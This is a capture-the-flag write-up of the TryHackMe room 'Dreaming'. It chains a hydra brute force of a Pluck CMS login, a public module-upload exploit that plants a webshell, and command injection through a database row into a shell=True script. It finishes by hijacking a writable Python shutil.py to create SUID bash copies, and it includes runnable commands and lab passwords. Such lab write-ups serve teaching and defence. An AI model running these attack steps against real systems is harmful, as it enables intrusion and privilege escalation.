---
title: "TryHackMe - Dreaming"
date: 2026-07-31 19:00:00 -0400
categories: [Writeups, Web-PrivEsc]
tags: [tryhackme, pluck, cms, command-injection, python-library-hijacking, mysql, privesc]
media_subpath: /assets/img/posts/dreaming/
toc: true
---

<!--
  IMAGES: drop your PNGs in  assets/img/posts/dreaming/  and keep the filenames
  used below (recon-gobuster.png, etc.). Chirpy resolves them via media_subpath.
  Delete any image line you don't have a shot for.
-->

## Context

A Sandman-themed TryHackMe room. The tagline given on the task:

> *While the king of dreams was imprisoned, his home fell into ruins. Can you help Sandman restore his kingdom?*

Three flags to recover: the Lucien flag, the Death flag, and the Morpheus flag.

## Reconnaissance

Full port scan with service detection:

```bash
nmap -sV -sC -p- -T4 10.64.181.21
```

![nmap scan results](recon-nmap.png)
_Full port scan: only 22 (SSH) and 80 (HTTP) open._

Useful results:

| Port | Service | Note |
|------|---------|------|
| 22 | OpenSSH 8.2p1 | no access without creds |
| 80 | Apache 2.4.41 (Ubuntu) | only the default page at `/` |

The root of port 80 is just the Apache default page, so I enumerate directories:

```bash
gobuster dir -u http://10.64.181.21 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gobuster finding /app](recon-gobuster.png)
_`gobuster` finds `/app`, which autoindexes `pluck-4.7.13/`._

`/app` shows up, and browsing it exposes an autoindex containing `pluck-4.7.13/`. The fingerprint is the whole game here: **Pluck CMS, version 4.7.13**.

![Pluck login page](recon-pluck-login.png)
_The local Pluck login: password only, no username._

A note on a false trail: the CMS footer links to `pluck-cms.org`, whose own site sits behind a Plesk hosting panel. That is the vendor's infrastructure, not the target. The real login is the local one at `/app/pluck-4.7.13/login.php`, which asks for a password only (no username).

## Initial access - www-data

A known-version CMS means checking for public exploits first:

```bash
searchsploit pluck 4.7.13
```

![Pluck login page](searchsploit-pluck.png)

The exploit is **authenticated**: it needs the admin password before it can upload its payload. So the login has to fall first.

### Brute forcing the login

Capturing the login POST shows a single relevant field, `cont1` (the password), plus a hidden honeypot `bogus`:

![Pluck login page](login-post.png)

The failure string in the response is `Password incorrect.`. That is everything `hydra` needs:

![Pluck login page](failure-string.png)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/app/pluck-4.7.13/login.php:cont1=^PASS^&bogus=&submit=Log in:Password incorrect."
```

![hydra cracking the password](access-hydra.png)
_`hydra` recovers the admin password in seconds._

The `-l admin` is just a placeholder: there is no `^USER^` in the form string, so the value is never sent. Password found almost instantly: `password`.

### RCE

The exploit abuses Pluck's module-install feature: it logs in with the supplied password, then uploads a `.zip` "module" containing a malicious `.php` that lands in a web-accessible folder.

![Pluck login page](copy-payload.png)

```bash
python3 49909.py 10.64.181.21 80 password /app/pluck-4.7.13
```
![Pluck login page](exec-payload.png)

Note the 4th argument is only the CMS base path (`/app/pluck-4.7.13`), not a full URL. Result is a **p0wny webshell** at `/app/pluck-4.7.13/files/`, running as `www-data`.

![p0wny webshell](access-p0wny-shell.png)
_The uploaded p0wny webshell, running as `www-data`._

## www-data -> lucien

`www-data` is a low-privilege service account with no password, so `sudo` and `su` are dead ends from here. Time to hunt for credentials. Enumerating `/opt` (normally empty on Ubuntu) turns up an interesting pair of scripts:

![Pluck login page](otp.png)

`/opt/test.py` is world-readable and belongs to lucien:

![lucien password in /opt/test.py](lucien-optpass.png)
_A cleartext password sitting in a script owned by lucien._

A password in cleartext, in a script owned by lucien. Credential reuse pays off, it works over SSH:

![lucien flag](lucien-ssh-connect.png)

![lucien flag](lucien-flag.png)
_First flag captured over a clean SSH session._

## lucien -> death

`lucien` sudo rights lay out the whole next step:

```bash
sudo -l
# (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

![lucien sudo -l](death-sudo-l.png)
_lucien may run `getDreams.py` as death, no password._

Reading `getDreams.py` (also in `/opt`) shows the vulnerability. It pulls rows from a MySQL table and feeds them straight into a shell command:

```bash
cat /opt/getDreams.py
```

```python
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

`shell=True` on unsanitised DB data is a **command injection**. If I control the `dreamer` value, I control the command, and the script runs as death via the sudo rule.

![lucien sudo -l](lucien-bash-history.png)

`lucien` `.bash_history` even leaks the DB password (`mysql -u lucien -plucien42DBPASSWORD`), so I connect and inspect the table:

![lucien sudo -l](connect-mysql.png)

Inject a row whose `dreamer` breaks out of the `echo` and drops a SUID copy of bash. The `;` ends the harmless `echo`, my commands follow, and the trailing `'` closes the SQL string:

```sql
INSERT INTO dreams (dreamer, dream)
VALUES ('x;cp /bin/bash /tmp/b;chmod +s /tmp/b;', 'p');
```

![command injection row in the dreams table](death-injection.png)
_The malicious row queued in the `dreams` table._

`chmod +s` works because death creates `/tmp/b` with the `cp`, so death owns it and can set SUID on it. Trigger the script through the sudo rule, then use the SUID shell:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
/tmp/b -p          
id               
cat /home/death/death_flag.txt
```

![lucien sudo -l](b-creation.png)


![death euid and flag](death-flag.png)
_`euid=1001(death)` via the SUID bash, and the second flag._

## death -> morpheus

The real death password is in `getDreams.py` too (`!mementoMORI666!`), so I drop the SUID bash and switch to a proper `su death` session.

![death euid and flag](death-password.png)

From death, `/home/morpheus/restore.py` is world-readable, so I read it:

![death euid and flag](read-restore.png)

It imports `shutil` with `from shutil import copy2`. If that module is one I can edit, my code will run whenever the script imports it, with the privileges of whoever runs the script. That is a **Python library hijacking**.

But who runs `restore.py`? I enumerate the running processes with **pspy** to catch any scheduled job:

![death euid and flag](wget-pspy.png)

![death euid and flag](pspy1.png)

![death euid and flag](pspy2.png)

![death euid and flag](pspy-restore1.png)

![death euid and flag](pspy-restore2.png)

_`pspy` catches `restore.py` running every minute as UID 1002 (morpheus)._

So a morpheus cron runs it every minute. I don't run the script myself (that would run as death); I poison `shutil.py` and let morpheus's cron trigger it.

First I confirm the module is writable:

![death euid and flag](right-shutil.png)

```
-rw-rw-r-- 1 root death /usr/lib/python3.8/shutil.py
```

The group is `death` and it is group-writable, so I can edit it. I prepend two lines to `shutil.py` that copy bash and set the SUID bit, keeping the original module below them so `copy2` still exists and `restore.py` doesn't crash:

```bash
(echo 'import os'; echo 'os.system("cp /bin/bash /tmp/m; chmod +s /tmp/m")'; cat /usr/lib/python3.8/shutil.py) > /tmp/shutil_new

cat /tmp/shutil_new > /usr/lib/python3.8/shutil.py
```

The prepended code runs at import time, as soon as `restore.py` does `from shutil import copy2`. Since morpheus's cron is the one importing the module, the resulting `/tmp/m` is owned by morpheus. Wait one minute for the next run, then use it:

```bash
ls -la /tmp/m   
/tmp/m -p
id               
cat /home/morpheus/morpheus_flag.txt
```

![death euid and flag](m-payload.png)

![morpheus euid and flag](morpheus-flag.png)
_`euid=1002(morpheus)` and the final flag._

## Takeaways

- **Read the source first.** Two of the three escalations came straight from reading files: a cleartext password in `/opt/test.py` and the unsafe call in `getDreams.py`. Hardcoded secrets in scripts are a routine real-world finding too, so grep for them early.
- **Never pass untrusted input to a shell.** `getDreams.py` ran database values through `subprocess(..., shell=True)`, the textbook command-injection sink. The fix: call the program with an argument list and `shell=False`.
- **An empty `/etc/crontab` doesn't mean no cron.** System crontabs don't list per-user jobs, so use `pspy` to catch scheduled tasks off the process table, which is how the morpheus job surfaced.
- **Use `bash -p` on a SUID shell.** Without it, bash drops the effective uid on startup and the SUID is wasted.
- **Least privilege breaks the chain (defensive).** Every hop reused something left too open: a password in `/opt`, a broad `sudo` rule, a group-writable `shutil.py` loaded by a scheduled job. Never let a privileged context load a file writable by lower-privileged users.

## Tools

`nmap`, `gobuster`, `searchsploit` (EDB 49909), `hydra`, `pspy`, `mysql`.
